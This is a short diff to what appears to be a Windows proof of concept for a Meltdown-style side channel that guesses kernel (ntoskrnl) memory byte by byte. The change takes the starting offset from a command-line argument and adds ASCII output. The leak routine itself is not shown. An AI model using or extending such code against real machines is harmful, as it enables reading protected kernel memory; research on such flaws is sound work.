@@ -6,6 +6,9 @@
 #include <stdio.h>
 #include <Windows.h>
 #include <intrin.h>
+#include <sstream>
+
+using namespace std;
 
 #ifdef __cplusplus
 # define EXTERN_C_START extern "C" {
@@ -109,7 +112,7 @@ size_t run_attempt_single(BYTE* ptr)
  
 BYTE* value;
  
-int main()
+int main(int argc, char *argv[])
 {
     int cpuinfo[4];
     __cpuidex(cpuinfo, 0, 0);
@@ -138,12 +141,16 @@ int main()
     IMAGE_DOS_HEADER* imgDos = (IMAGE_DOS_HEADER*)(hMod);
     IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(hMod + imgDos->e_lfanew);
  
-    size_t i = 0x1000;
+    stringstream ss(argv[1]);
+    int x = 0;
+    ss >> x;
+    size_t i = x;
+
     while(TRUE)
     {
         BYTE* addr = (BYTE*)ntoskrnlBase;
         size_t guess = run_attempt_single(&addr[i]);
-        printf("0x%02x: guess: 0x%02x, real:0x%02x\n", i, guess, hMod[i]);
+        printf("0x%02x: guess: 0x%02x, real:0x%02x, ascii:%c\n", i, guess, hMod[i], hMod[i]);
         i++;
     }
  
